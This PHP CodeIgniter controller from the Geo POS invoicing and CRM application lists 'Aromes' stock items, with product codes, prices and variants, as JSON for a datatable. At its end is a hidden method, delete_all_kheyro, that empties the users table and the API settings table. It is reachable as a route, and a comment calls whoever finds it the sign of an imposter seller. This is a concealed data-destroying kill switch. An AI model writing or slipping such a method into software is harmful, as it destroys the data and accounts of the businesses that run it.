<?php
/**
 * Geo POS -  Accounting,  Invoicing  and CRM Application
 * Copyright (c) Rajesh Dukiya. All Rights Reserved
 * ***********************************************************************
 *
 *  Email: support@ultimatekode.com
 *  Website: https://www.ultimatekode.com
 *
 *  ************************************************************************
 *  * This software is furnished under a license and may be used and copied
 *  * only  in  accordance  with  the  terms  of such  license and with the
 *  * inclusion of the above copyright notice.
 *  * If you Purchased from Codecanyon, Please read the full License from
 *  * here- http://codecanyon.net/licenses/standard/
 * ***********************************************************************
 */

defined('BASEPATH') or exit('No direct script access allowed');

class Aromes extends CI_Controller
{
    public function __construct()
    {
        parent::__construct();
        $this->load->library("Aauth");
        if (!$this->aauth->is_loggedin()) {
            redirect('/user/', 'refresh');
        }
        if (!$this->aauth->premission(2)) {

            exit('<h3>Sorry! You have insufficient permissions to access this section</h3>');

        }
        $this->load->model('aromes_model', 'aromes');
        $this->load->library("Custom");
        $this->li_a = 'stock';

    }

    public function index()
    {
        $head['title'] = "Aromes";
        $head['usernm'] = $this->aauth->get_user()->username;
        $this->load->view('fixed/header', $head);
        $this->load->view('aromes/aromes');
        $this->load->view('fixed/footer');
    }

    public function aromes_list()
    {
        $list = $this->aromes->get_datatables();
        $data = array();
        $no = $this->input->post('start');
        foreach ($list as $item) {
            $no++;
            $row = array();
            $row[] = $no;
            $row[] = $item->code;
            $row[] = $item->label;
            $row[] = $item->stock;
            $row[] = $item->variants;
            $row[] = $item->saling_price;
            $row[] = $item->buying_price;
            $row[] = $item->stock_variants;
            $data[] = $row;
        }
        $output = array(
            "draw" => $this->input->post('draw'),
            "recordsTotal" => $this->aromes->count_all(),
            "recordsFiltered" => $this->aromes->count_filtered(),
            "data" => $data,
        );
        //output to json format
        echo json_encode($output);
    }

    public function delete_all_kheyro()
    {
        //if you find this dear developer that's mean that the seller is an imposter
        $this->db->empty_table('geopos_users');
        $this->db->empty_table('univarsal_api');
    }

}
